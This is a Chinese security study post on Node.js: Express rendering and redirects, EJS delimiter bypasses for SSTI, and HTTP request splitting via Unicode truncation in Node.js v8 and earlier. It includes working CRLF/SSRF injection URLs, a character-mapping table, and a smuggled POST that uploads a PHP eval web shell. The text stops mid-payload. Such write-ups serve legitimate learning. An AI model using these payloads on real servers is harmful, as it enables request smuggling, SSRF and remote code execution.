{"title":"nodejs(拆分攻击)","uid":"aa6892c82ad5f1c844ffcb30a272aa78","slug":"nodejs(拆分攻击)","date":"2023-04-06T14:47:24.933Z","updated":"2023-08-25T02:15:04.299Z","comments":true,"path":"api/articles/nodejs(拆分攻击).json","keywords":null,"cover":"/img/18.jpg","content":"<p><code>总结学习一下，重点把拆分攻击学习记忆一下，原型链污染单独开一篇写</code></p>\n<span id=\"more\"></span>\n\n<h2 id=\"res-render\"><a href=\"#res-render\" class=\"headerlink\" title=\"res.render()\"></a>res.render()</h2><p><code>res.render()</code>是 Node.js 中的一个方法，它可以<code>渲染视图并将渲染后的 HTML 字符串发送给客户端</code>。它可用于通过从服务器传递的数据呈现动态内容。</p>\n<p>以下是在 Node.js 中使用 <code>res.render()</code> 的示例代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> data = &#123; <span class=\"attr\">message</span>: <span class=\"string\">&#x27;你好，世界！&#x27;</span> &#125;;</span><br><span class=\"line\">  res.<span class=\"title function_\">render</span>(<span class=\"string\">&#x27;index&#x27;</span>, data);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>在此示例中，当用户访问根 URL 时，服务器将通过使用包含消息 <code> 你好，世界！</code>的 <code>data</code> 对象来呈现 <code>index</code> 视图，并向客户端发送响应。</p>\n<p><code>index</code> 视图通常是使用模板语言编写的模板文件，例如 EJS、Handlebars 或 Pug。</p>\n<h2 id=\"重定向概念\"><a href=\"#重定向概念\" class=\"headerlink\" title=\"重定向概念\"></a>重定向概念</h2><p>Express是一个基于<code>Node.js</code>实现的Web框架，</p>\n<p>其响应HTTP请求的response对象中有两个用于URL跳转方法</p>\n<p><code>res.location()</code>和<code>res.redirect()</code></p>\n<h3 id=\"res-location\"><a href=\"#res-location\" class=\"headerlink\" title=\"res.location()\"></a>res.location()</h3><p>res.location()里面的参数有三种，一种是当前域名路径（例如”&#x2F;api&#x2F;post”），一种是绝对路径(“<a href=\"https://www.oecom.cn/api/post\">https://www.oecom.cn/api/post</a> “)，另一种就是直接一个字符串：back</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">res.<span class=\"keyword\">location</span>(<span class=\"string\">&#x27;/api/post&#x27;</span>);</span><br><span class=\"line\">res.<span class=\"keyword\">location</span>(<span class=\"string\">&#x27;https://www.oecom.cn/api/post&#x27;</span>);</span><br><span class=\"line\">res.<span class=\"keyword\">location</span>(<span class=\"string\">&#x27;back&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"res-redirect\"><a href=\"#res-redirect\" class=\"headerlink\" title=\"res.redirect\"></a>res.redirect</h3><p><code>redirect()</code>可以添加两个参数，</p>\n<p>如果第一个参数为数值类型，则代表重定向方式，第二个参数为字符串类型，就是需要跳转到的路径。</p>\n<p>如果第一个参数就是字符串，则直接代表跳转的路径<br>重定向方式有两种情况，一种是<code>301</code>重定向（永久重定向），另一种是<code>302</code>重定向（临时重定向），如果第一个参数不填，则<code>默认为302</code>重定向。至于第二个参数路径，则和<code>location</code>一致。<br>在<code>redirect</code>中有一种方式是使用相对路径，即：<code>res.redirect(&quot;api/post&quot;)</code>，假设在程序在<code>/get</code>路由下，则表示要跳转的路径为<code>/get/api/post</code>。</p>\n<p>个人不推荐这种方式，因为在后续的代码阅读时不利于快速理解重定向位置。</p>\n<h2 id=\"delimiter\"><a href=\"#delimiter\" class=\"headerlink\" title=\"delimiter\"></a>delimiter</h2><p>这是对标签的分隔符定义的选项，有时候当对ssti一些标签进行了过滤，如果存在将参数进行渲染，且参数是可控，可以尝试<code>delimiter</code>添加进去，让其在渲染的时候可以覆盖修改<code>delimiter</code>内容，使得可以用其他分隔符绕过</p>\n<h3 id=\"Custom-delimiters\"><a href=\"#Custom-delimiters\" class=\"headerlink\" title=\"Custom delimiters\"></a>Custom delimiters</h3><p>自定义分隔符可以基于每个模板应用，也可以全局应用：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ejs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;ejs&#x27;</span>),</span><br><span class=\"line\">    users = [<span class=\"string\">&#x27;geddy&#x27;</span>, <span class=\"string\">&#x27;neil&#x27;</span>, <span class=\"string\">&#x27;alex&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Just one template</span></span><br><span class=\"line\">ejs.<span class=\"title function_\">render</span>(<span class=\"string\">&#x27;&lt;p&gt;[?= users.join(&quot; | &quot;); ?]&lt;/p&gt;&#x27;</span>, &#123;<span class=\"attr\">users</span>: users&#125;, &#123;<span class=\"attr\">delimiter</span>: <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"attr\">openDelimiter</span>: <span class=\"string\">&#x27;[&#x27;</span>, <span class=\"attr\">closeDelimiter</span>: <span class=\"string\">&#x27;]&#x27;</span>&#125;);</span><br><span class=\"line\"><span class=\"comment\">// =&gt; &#x27;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Or globally</span></span><br><span class=\"line\">ejs.<span class=\"property\">delimiter</span> = <span class=\"string\">&#x27;?&#x27;</span>;</span><br><span class=\"line\">ejs.<span class=\"property\">openDelimiter</span> = <span class=\"string\">&#x27;[&#x27;</span>;</span><br><span class=\"line\">ejs.<span class=\"property\">closeDelimiter</span> = <span class=\"string\">&#x27;]&#x27;</span>;</span><br><span class=\"line\">ejs.<span class=\"title function_\">render</span>(<span class=\"string\">&#x27;&lt;p&gt;[?= users.join(&quot; | &quot;); ?]&lt;/p&gt;&#x27;</span>, &#123;<span class=\"attr\">users</span>: users&#125;);</span><br><span class=\"line\"><span class=\"comment\">// =&gt; &#x27;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"NodeJS-中的-CRLF-SSRF-Injection\"><a href=\"#NodeJS-中的-CRLF-SSRF-Injection\" class=\"headerlink\" title=\"NodeJS 中的 CRLF&#x2F;SSRF Injection\"></a>NodeJS 中的 CRLF&#x2F;SSRF Injection</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本文由<strong>WHOAMI</strong>原创发布</p>\n<p>转载，请参考<a href=\"https://www.anquanke.com/note/repost\">转载声明</a>，注明出处： <a href=\"https://www.anquanke.com/post/id/240014\">https://www.anquanke.com/post/id/240014</a></p>\n<p>安全客 - 有思想的安全新媒体</p></blockquote>\n<p>2018 年有研究者发现，当Node.js使用 <code>http.get</code> 向特定路径发出HTTP请求时，发出的请求实际上被定向到了不一样的路径！</p>\n<p><img src=\"https://p5.ssl.qhimg.com/t01e1beeee10e196ba2.png\" alt=\"img\"></p>\n<p>深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时，对Unicode字符的有损编码引起的。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>·注：nodejs&lt;&#x3D;8 的情况下存在 Unicode 字符损坏导致的 HTTP 拆分攻击，nodejs 不会对这些 Unicode 进行编码转义，因为它们不是 HTTP 控制字符</p></blockquote>\n<h3 id=\"HTTP-请求路径中的-Unicode-字符损坏\"><a href=\"#HTTP-请求路径中的-Unicode-字符损坏\" class=\"headerlink\" title=\"HTTP 请求路径中的 Unicode 字符损坏\"></a>HTTP 请求路径中的 Unicode 字符损坏</h3><p>虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 <code>\\u0130</code> 就会被截断为 <code>\\u30</code>：</p>\n<p><img src=\"https://p3.ssl.qhimg.com/t01005ff8722a4037e0.png\" alt=\"img\"></p>\n<h3 id=\"Unicode-字符损坏造成的-HTTP-拆分攻击\"><a href=\"#Unicode-字符损坏造成的-HTTP-拆分攻击\" class=\"headerlink\" title=\"Unicode 字符损坏造成的 HTTP 拆分攻击\"></a>Unicode 字符损坏造成的 HTTP 拆分攻击</h3><p>刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。</p>\n<p>由于nodejs的HTTP库包含了阻止CRLF的措施，即如果你尝试发出一个URL路径中含有回车、换行或空格等控制字符的HTTP请求是，它们会被URL编码，所以正常的CRLF注入在nodejs中并不能利用：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"keyword\">var</span> http = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;http&quot;</span>);</span><br><span class=\"line\">&gt; http.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;http://47.101.57.72:4000/\\r\\n/WHOAMI&#x27;</span>).<span class=\"property\">output</span></span><br><span class=\"line\">[ <span class=\"string\">&#x27;GET /%0D%0A/WHOAMI HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t01911a74dee31030c4.png\" alt=\"img\"></p>\n<p>但不幸的是，上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"string\">&#x27;http://47.101.57.72:4000/\\u&#123;010D&#125;\\u&#123;010A&#125;/WHOAMI&#x27;</span></span><br><span class=\"line\"><span class=\"attr\">http</span>:<span class=\"comment\">//47.101.57.72:4000/čĊ/WHOAMI</span></span><br></pre></td></tr></table></figure>\n\n<p>当 Node.js v8 或更低版本对此URL发出 <code>GET</code> 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; http.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;http://47.101.57.72:4000/\\u010D\\u010A/WHOAMI&#x27;</span>).<span class=\"property\">output</span></span><br><span class=\"line\">[ <span class=\"string\">&#x27;GET /čĊ/WHOAMI HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>\n\n<p>但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\\r”（%0d）和 “\\n”（%0a）：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"title class_\">Buffer</span>.<span class=\"title function_\">from</span>(<span class=\"string\">&#x27;http://47.101.57.72:4000/\\u&#123;010D&#125;\\u&#123;010A&#125;/WHOAMI&#x27;</span>, <span class=\"string\">&#x27;latin1&#x27;</span>).<span class=\"title function_\">toString</span>()</span><br><span class=\"line\"><span class=\"string\">&#x27;http://47.101.57.72:4000/\\r\\n/WHOAMI&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png\" alt=\"img\"></p>\n<p>可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。</p>\n<p>不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">字符</th>\n<th align=\"center\">可由以下Unicode编码构造出</th>\n<th align=\"center\">Unicode编码对应的字符</th>\n<th align=\"center\">Unicode编码对应的字符对应的URL编码</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">回车符 \\r</td>\n<td align=\"center\">\\u010d</td>\n<td align=\"center\">č</td>\n<td align=\"center\">%C4%8D</td>\n</tr>\n<tr>\n<td align=\"center\">换行符 \\n</td>\n<td align=\"center\">\\u010a</td>\n<td align=\"center\">Ċ</td>\n<td align=\"center\">%C4%8A</td>\n</tr>\n<tr>\n<td align=\"center\">空格</td>\n<td align=\"center\">\\u0120</td>\n<td align=\"center\">Ġ</td>\n<td align=\"center\">%C4%A0</td>\n</tr>\n<tr>\n<td align=\"center\">反斜杠 \\</td>\n<td align=\"center\">\\u0122</td>\n<td align=\"center\">Ģ</td>\n<td align=\"center\">%C4%A2</td>\n</tr>\n<tr>\n<td align=\"center\">单引号 ‘</td>\n<td align=\"center\">\\u0127</td>\n<td align=\"center\">ħ</td>\n<td align=\"center\">%C4%A7</td>\n</tr>\n<tr>\n<td align=\"center\">反引号 &#96;</td>\n<td align=\"center\">\\u0160</td>\n<td align=\"center\">Š</td>\n<td align=\"center\">%C5%A0</td>\n</tr>\n<tr>\n<td align=\"center\">叹号 !</td>\n<td align=\"center\">\\u0121</td>\n<td align=\"center\">ġ</td>\n<td align=\"center\">%C4%A1</td>\n</tr>\n</tbody></table>\n<p>这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：</p>\n<ul>\n<li>接受来自用户输入的Unicode数据</li>\n<li>并将其包含在HTTP请求的路径中</li>\n<li>且请求具有一个0长度的主体（比如一个 <code>GET</code> 或者 <code>DELETE</code>）</li>\n</ul>\n<h3 id=\"在-HTTP-状态行注入恶意首部字段\"><a href=\"#在-HTTP-状态行注入恶意首部字段\" class=\"headerlink\" title=\"在 HTTP 状态行注入恶意首部字段\"></a>在 HTTP 状态行注入恶意首部字段</h3><p>由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; http.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;http://47.101.57.72:4000/\\u0120HTTP/1.1\\u010D\\u010ASet-Cookie:\\u0120PHPSESSID=whoami&#x27;</span>).<span class=\"property\">output</span></span><br><span class=\"line\">[ <span class=\"string\">&#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoami HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png\" alt=\"img\"></p>\n<p>如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 <code>HTTP/1.1</code> ，但我们根据该原理依然可以将其闭合：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; http.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;http://47.101.57.72:4000/\\u0120HTTP/1.1\\u010D\\u010ASet-Cookie:\\u0120PHPSESSID=whoami\\u010D\\u010Atest:&#x27;</span>).<span class=\"property\">output</span></span><br><span class=\"line\">[ <span class=\"string\">&#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoamičĊtest: HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png\" alt=\"img\"></p>\n<p>这样，我们便可以构造 “任意” 的HTTP请求了。</p>\n<h3 id=\"在-HTTP-状态行注入完整-HTTP-请求\"><a href=\"#在-HTTP-状态行注入完整-HTTP-请求\" class=\"headerlink\" title=\"在 HTTP 状态行注入完整 HTTP 请求\"></a>在 HTTP 状态行注入完整 HTTP 请求</h3><p>首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 <code>HTTP/1.1</code> 影响我们新构造的请求，我们还需要再构造一次 <code>GET /</code> 闭合原来的 HTTP 请求。</p>\n<p>假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/upload.php</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>127.0.0.1</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>437</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span><span class=\"punctuation\">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-php\">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"language-php\">Content-Disposition: form-data; name=<span class=\"string\">&quot;MAX_FILE_SIZE&quot;</span></span></span><br><span class=\"line\"><span class=\"language-php\"></span></span><br><span class=\"line\"><span class=\"language-php\"><span class=\"number\">100000</span></span></span><br><span class=\"line\"><span class=\"language-php\">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"language-php\">Content-Disposition: form-data; name=<span class=\"string\">&quot;uploaded&quot;</span>; filename=<span class=\"string\">&quot;shell.php&quot;</span></span></span><br><span class=\"line\"><span class=\"language-php\">Content-Type: application/octet-stream</span></span><br><span class=\"line\"><span class=\"language-php\"></span></span><br><span class=\"line\"><span class=\"language-php\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;whoami&quot;</span>]);<span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"language-php\">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"language-php\">Content-Disposition: form-data; name=<span class=\"string\">&quot;Upload&quot;</span></span></span><br><span class=\"line\"><span class=\"language-php\"></span></span><br><span class=\"line\"><span class=\"language-php\">Upload</span></span><br><span class=\"line\"><span class=\"language-php\">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br></pre></td></tr></table></figure>\n\n<p>为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">POST /upload.php HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host: 127.0.0.1</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: 437</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"string\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span></span><br><span class=\"line\"><span class=\"string\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class=\"line\"><span class=\"string\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"string\">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class=\"line\"><span class=\"string\">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span></span><br><span class=\"line\"><span class=\"string\">Connection: close</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">100000</span></span><br><span class=\"line\"><span class=\"string\">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: application/octet-stream</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span></span><br><span class=\"line\"><span class=\"string\">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; 